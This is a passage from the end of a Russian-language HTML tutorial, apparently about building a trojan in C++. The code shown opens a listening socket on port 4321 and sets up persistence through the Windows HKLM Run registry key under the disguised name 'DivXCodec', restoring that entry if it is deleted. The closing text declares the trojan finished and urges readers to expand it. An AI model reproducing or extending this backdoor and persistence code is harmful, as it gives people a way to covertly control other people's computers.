font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">else</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        Application-&gt;Terminate</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// я тут не разбирал вариантов типа прога записалась в винды, но ее еще раз </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// запустили и им подобных, додумайте сами =)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">else</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />ServSckt-&gt;Port = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">4321</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />ServSckt-&gt;Active = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">true</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; <br /> <br />String data;<br />TRegistry *pReg = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">new</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TRegistry;<br />pReg-&gt;RootKey=HKEY_LOCAL_MACHINE;<br />pReg-&gt;OpenKey</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Software</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Microsoft</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Windows</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">CurrentVersion</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Run&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">true</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />data=pReg-&gt;ReadString</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;DivXCodec&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">data != Application-&gt;ExeName</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// не дай бог стерли!</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />    pReg-&gt;WriteString</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;DivXCodec&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">,Application-&gt;ExeName</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// пишем назад</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">В принципе, это все. Троян готов! Конечно, он тяжеловат, малофункционален etc, НО все это можно исправить, творите =). Удачи! </span></p></body></html>